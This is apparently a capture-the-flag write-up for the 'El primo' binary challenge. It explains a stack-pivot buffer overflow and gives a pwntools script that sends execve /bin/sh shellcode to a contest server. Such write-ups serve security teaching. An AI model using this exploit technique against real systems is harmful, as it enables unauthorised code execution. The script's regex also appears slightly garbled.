# El primo

There's no NX, AND a gets call. On top of this, the program sends us the buffer address. A simple ret to shellcode, right?

Wrong, in fact. We have to buffer overflow from main, which makes things more difficult.
Instead of the classic leave ; ret, it pops a value into ecx, then loads ecx - 4 into esp.
This removes our classic buffer overflow where we change EIP. Instead, we must stack pivot.

We have control of ESP. When you call ret, the program jumps to the address stored at ESP.
We can set esp to the address of the buffer.
Then, we change the beginning of our buffer to be the address of our shellcode.I put the shellcode after the esp.

We can use pattern.py to figure out the amount of bytes until esp, which is 32.

### NOTE! it subtracts 4 from our chosen esp value, so we must take care of this.
I created custom shellcode that had to have the address of a string /bin/sh which I also put in the input.
```python
from pwn import *
import re
NUM_TO_ESP = 32
p = remote('p1.tjctf.org', 8011)
p.recvline()
output = p.recvline().decode()
bufaddr = int(re.findall("hint: (,*)", output)[0],16)
shellcode = asm(f"mov ebx,{hex(bufaddr + 4)} ; mov ecx,0 ; mov edx,0 ; mov eax,0xb ; int 0x80") 
start = flat(bufaddr + 36, b"/bin/sh\x00")
espval = bufaddr + 4
payload = start
payload += b'A' * (NUM_TO_ESP - len(payload))
payload += p32(espval)
payload += shellcode
p.sendline(payload)
p.interactive()
```
